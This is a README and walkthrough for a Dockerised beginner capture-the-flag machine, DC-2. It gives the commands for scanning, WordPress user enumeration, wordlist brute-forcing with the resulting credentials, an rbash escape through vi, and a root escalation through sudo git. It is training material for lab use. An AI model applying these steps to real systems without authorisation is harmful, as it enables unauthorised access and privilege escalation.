# DC-2 CTF Machine

> **Security Level:** Beginner  
> **Platform:** Docker  
> **Goal:** Capture all 5 flags and gain root access

---

## Quick Start

```bash
# 1. Clone / download this folder, then build and run
docker-compose up --build -d

# 2. Find the container's IP (or use the fixed one: 192.168.100.101)
docker inspect dc-2 | grep '"IPAddress"'

# 3. Add the domain to your attacker's /etc/hosts
echo "192.168.100.101  dc-2" | sudo tee -a /etc/hosts

# 4. Visit http://dc-2 in your browser — you're ready to hack!
```

> **First start takes ~2–3 minutes** while WordPress is installed.  
> Subsequent starts are instant.

---

## Network Details

| Service | Port | Notes |
|---------|------|-------|
| HTTP (WordPress) | 80 | Domain: `dc-2` |
| SSH | **7744** | Non-standard port — discovered with `nmap -p-` |

---

## Penetration Methodology

Follow the steps below — each builds on the last.

### 1 · Network Scanning
```bash
nmap -p- -A <TARGET_IP>
```
Look for two open ports and notice the HTTP redirect to `http://dc-2/`.

### 2 · Add Domain to /etc/hosts
```bash
echo "<TARGET_IP>  dc-2" | sudo tee -a /etc/hosts
```

### 3 · Browse the WordPress Site
Visit `http://dc-2` and explore the pages, especially the **Flag** page.

### 4 · WordPress User Enumeration
```bash
wpscan --url http://dc-2 --enumerate u
```
You'll find three users: **admin**, **tom**, **jerry**.

### 5 · Build a Custom Wordlist with cewl
```bash
cewl http://dc-2/ > password.txt
cat password.txt
```
The site content contains the passwords hidden in plain sight.

### 6 · Brute-Force WordPress Login
```bash
wpscan --url http://dc-2 -U users.txt -P password.txt
```
Credentials found:
- `jerry : adipiscing`
- `tom   : parturient`

### 7 · Log into WordPress as Jerry
Visit `http://dc-2/wp-admin` → login as **jerry** → find **Flag 2** in the dashboard.

### 8 · SSH Login as Tom
```bash
ssh tom@<TARGET_IP> -p 7744
# password: parturient
```
You'll land in a **restricted shell (rbash)**. Only a handful of commands work.

### 9 · Escape rbash via Vi
```bash
vi
```
Inside vi:
```
:set shell=/bin/bash
:shell
```
Now export a working PATH:
```bash
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash
cat flag3.txt
```

### 10 · Privilege Escalation via sudo + git
```bash
sudo -l
# tom can run: /usr/bin/git (NOPASSWD)

sudo git help add
# Inside the pager (less), type:
!/bin/bash
```
You now have a **root shell**!

### 11 · Read the Final Flag
```bash
cd /root
cat final-flag.txt
```

---

## Flag Locations

| Flag | Location | How to Access |
|------|----------|---------------|
| Flag 1 | WordPress "Flag" page | `http://dc-2/flag/` (public) |
| Flag 2 | WordPress private post | Log in as **jerry** in WP admin |
| Flag 3 | `/home/tom/flag3.txt` | SSH as tom + escape rbash |
| Flag 4 | `/home/jerry/flag4.txt` | Accessible after shell escape |
| Final Flag | `/root/final-flag.txt` | Root shell via sudo git |

---

## Useful Commands Reference

```bash
# Build only
docker build -t dc2-ctf .

# Run without compose
docker run -d --name dc-2 -p 80:80 -p 7744:7744 dc2-ctf

# View container logs
docker logs -f dc-2

# Get a shell inside the container (for debugging)
docker exec -it dc-2 /bin/bash

# Stop and remove
docker-compose down -v
```

---

## Troubleshooting

| Issue | Fix |
|-------|-----|
| `http://dc-2` doesn't load | Check `/etc/hosts` has the correct IP |
| Port 80 already in use | Change `"80:80"` to e.g. `"8080:80"` in `docker-compose.yml` |
| WordPress not ready yet | Wait ~2–3 min on first start; watch `docker logs -f dc-2` |
| SSH connection refused | Ensure port `7744` is mapped and container is running |
| rbash escape doesn't work | Make sure you're inside `vi` and type `:set shell=/bin/bash` then `:shell` |

---

*Happy hacking! — DC Series*
